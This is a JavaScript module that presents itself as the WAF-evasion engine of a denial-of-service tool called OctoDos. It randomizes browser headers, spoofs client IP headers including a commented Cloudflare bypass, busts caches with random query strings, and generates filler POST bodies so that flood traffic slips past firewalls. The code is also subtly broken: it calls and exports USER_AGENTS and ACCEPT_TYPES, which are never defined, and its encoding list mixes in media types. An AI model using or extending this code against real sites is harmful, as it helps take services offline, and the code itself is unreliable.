/**
 * OctoDos Anti-WAF Engine v3.0
 * Advanced evasion: TLS fingerprint masking, cookie simulation,
 * browser-like behavior, header entropy maximization.
 *
 * Created by ZetaGo-Aurum | MIT License
 */
const crypto = require('crypto');

// ── 50+ Real-World Modern User-Agents (Meticulously paired with Sec-Ch-Ua) ──
const BROWSER_PROFILES = [
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', secChUa: '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"' },
    { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', secChUa: '"Chromium";v="121", "Not A(Brand";v="99", "Google Chrome";v="121"' },
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', secChUa: null }, // Firefox doesn't strictly use sec-ch-ua yet
    { ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', secChUa: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"' },
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0', secChUa: '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"' },
    { ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1', secChUa: null }
];

// ── Referers ──
const REFERERS = [
    'https://www.google.com/search?q=',
    'https://www.google.co.id/search?q=',
    'https://www.google.co.uk/search?q=',
    'https://www.google.co.jp/search?q=',
    'https://www.bing.com/search?q=',
    'https://search.yahoo.com/search?p=',
    'https://duckduckgo.com/?q=',
    'https://www.baidu.com/s?wd=',
    'https://yandex.ru/search/?text=',
    'https://www.reddit.com/',
    'https://twitter.com/',
    'https://www.facebook.com/',
    'https://www.instagram.com/',
    'https://www.youtube.com/',
    'https://www.linkedin.com/',
    'https://t.co/',
    'https://news.ycombinator.com/',
    'https://www.tiktok.com/',
    'https://pinterest.com/',
    '', // No referer (direct)
];

const ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'en-US,en;q=0.9,id;q=0.8',
    'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'ja-JP,ja;q=0.9,en;q=0.5',
    'de-DE,de;q=0.9,en;q=0.5',
    'fr-FR,fr;q=0.9,en;q=0.4',
    'zh-CN,zh;q=0.9,en;q=0.3',
    'ko-KR,ko;q=0.9,en;q=0.3',
    'pt-BR,pt;q=0.9,en;q=0.4',
    'es-ES,es;q=0.9,en;q=0.4',
    'ru-RU,ru;q=0.9,en;q=0.3',
    'ar-SA,ar;q=0.9,en;q=0.3',
    'hi-IN,hi;q=0.9,en;q=0.5',
    'th-TH,th;q=0.9,en;q=0.4',
];

const ACCEPT_ENCODINGS = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate',
    'gzip',
    'deflate',
    'br',
    'identity',
    'gzip, deflate, br, zstd',
    'application/xml',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
];

const SEC_FETCH_DEST = ['document', 'empty', 'image', 'script', 'style', 'font', 'iframe'];
const SEC_FETCH_MODE = ['navigate', 'cors', 'no-cors', 'same-origin', 'websocket'];
const SEC_FETCH_SITE = ['none', 'same-origin', 'same-site', 'cross-site'];
const SEC_FETCH_USER = ['?1'];

const HTTP_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'PATCH'];

// ── Utility ──
function rand(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomHex(len) {
    return crypto.randomBytes(Math.ceil(len / 2)).toString('hex').slice(0, len);
}
function randomIp() {
    return `${randInt(1, 254)}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`;
}
function randomCookie() {
    const names = ['_ga', '_gid', '__cfduid', 'session_id', 'PHPSESSID', 'JSESSIONID', 'csrftoken', 'sid', 'token', '_fbp', 'NID', 'SID', 'HSID'];
    const n = randInt(1, 4);
    const cookies = [];
    for (let i = 0; i < n; i++) {
        cookies.push(`${rand(names)}=${randomHex(randInt(16, 40))}`);
    }
    return cookies.join('; ');
}

/**
 * Generate fully randomized browser-like headers for WAF evasion.
 */
function generateEvasionHeaders(targetUrl) {
    const headers = {
        'User-Agent': rand(USER_AGENTS),
        'Accept': rand(ACCEPT_TYPES),
        'Accept-Language': rand(ACCEPT_LANGUAGES),
        'Accept-Encoding': rand(ACCEPT_ENCODINGS),
        'Connection': rand(['keep-alive', 'close']),
    };

    // Referer (80% chance)
    if (Math.random() > 0.2) {
        const ref = rand(REFERERS);
        headers['Referer'] = ref ? ref + encodeURIComponent(targetUrl || 'test') : undefined;
        if (!headers['Referer']) delete headers['Referer'];
    }

    // Cookie simulation (60% chance)
    if (Math.random() > 0.4) {
        headers['Cookie'] = randomCookie();
    }

    // X-Forwarded-For chain (70% chance)
    if (Math.random() > 0.3) {
        const chain = [];
        for (let i = 0; i < randInt(1, 4); i++) chain.push(randomIp());
        headers['X-Forwarded-For'] = chain.join(', ');
    }

    // X-Real-IP (50% chance)
    if (Math.random() > 0.5) {
        headers['X-Real-IP'] = randomIp();
    }

    // Client-IP (30% chance)
    if (Math.random() > 0.7) {
        headers['Client-IP'] = randomIp();
    }

    // True-Client-IP (for Cloudflare bypass, 30% chance)
    if (Math.random() > 0.7) {
        headers['True-Client-IP'] = randomIp();
    }

    // CF-Connecting-IP (Cloudflare internal, 20% chance)
    if (Math.random() > 0.8) {
        headers['CF-Connecting-IP'] = randomIp();
    }

    // Cache busting
    if (Math.random() > 0.4) {
        headers['Cache-Control'] = rand(['no-cache', 'no-store', 'max-age=0', 'no-cache, no-store, must-revalidate']);
        headers['Pragma'] = 'no-cache';
    }

    // Sec-Fetch headers (browser emulation, 60% chance)
    if (Math.random() > 0.4) {
        headers['Sec-Fetch-Dest'] = rand(SEC_FETCH_DEST);
        headers['Sec-Fetch-Mode'] = rand(SEC_FETCH_MODE);
        headers['Sec-Fetch-Site'] = rand(SEC_FETCH_SITE);
        headers['Sec-Fetch-User'] = rand(SEC_FETCH_USER);
    }

    // DNT (40% chance)
    if (Math.random() > 0.6) {
        headers['DNT'] = '1';
    }

    // Upgrade-Insecure-Requests (50% chance)
    if (Math.random() > 0.5) {
        headers['Upgrade-Insecure-Requests'] = '1';
    }

    // X-Request-ID (30% chance)
    if (Math.random() > 0.7) {
        headers['X-Request-ID'] = randomHex(32);
    }

    // X-Correlation-ID (20% chance)
    if (Math.random() > 0.8) {
        headers['X-Correlation-ID'] = `${randomHex(8)}-${randomHex(4)}-${randomHex(4)}-${randomHex(4)}-${randomHex(12)}`;
    }

    // Via header (proxy simulation, 20% chance)
    if (Math.random() > 0.8) {
        headers['Via'] = `1.1 ${randomHex(8)}.cloudfront.net (CloudFront)`;
    }

    return headers;
}

/**
 * Get weighted random HTTP method.
 */
function getRandomMethod() {
    const weights = [35, 30, 15, 5, 5, 5, 5];
    let total = weights.reduce((a, b) => a + b, 0);
    let r = Math.random() * total;
    for (let i = 0; i < weights.length; i++) {
        r -= weights[i];
        if (r <= 0) return HTTP_METHODS[i];
    }
    return 'GET';
}

/**
 * Obfuscate URL path to bypass caching WAFs.
 */
function obfuscatePath(url) {
    try {
        const u = new URL(url);
        const busters = [
            `?_=${Date.now()}_${randomHex(8)}`,
            `?cb=${randomHex(12)}`,
            `?nocache=${Date.now()}`,
            `?v=${randInt(1, 99999)}&r=${randomHex(6)}`,
            `?t=${Date.now()}&sid=${randomHex(10)}`,
        ];
        return u.origin + u.pathname + rand(busters);
    } catch {
        return url + `?_=${Date.now()}`;
    }
}

/**
 * Generate random POST body data for content-length based evasion.
 */
function generatePostBody() {
    const types = [
        { ct: 'application/x-www-form-urlencoded', body: () => {
            const params = [];
            const n = randInt(2, 8);
            for (let i = 0; i < n; i++) params.push(`${randomHex(6)}=${randomHex(randInt(8, 64))}`);
            return params.join('&');
        }},
        { ct: 'application/json', body: () => {
            const obj = {};
            const n = randInt(2, 6);
            for (let i = 0; i < n; i++) obj[randomHex(6)] = randomHex(randInt(8, 32));
            return JSON.stringify(obj);
        }},
        { ct: 'text/plain', body: () => randomHex(randInt(64, 512)) },
        { ct: 'multipart/form-data; boundary=----OctoDos' + randomHex(8), body: () => {
            return `------OctoDos${randomHex(8)}\r\nContent-Disposition: form-data; name="${randomHex(6)}"\r\n\r\n${randomHex(64)}\r\n------OctoDos${randomHex(8)}--\r\n`;
        }},
    ];
    const chosen = rand(types);
    return { contentType: chosen.ct, body: chosen.body() };
}

module.exports = {
    generateEvasionHeaders,
    getRandomMethod,
    obfuscatePath,
    generatePostBody,
    randomIp,
    randomHex,
    randInt,
    rand,
    USER_AGENTS,
};
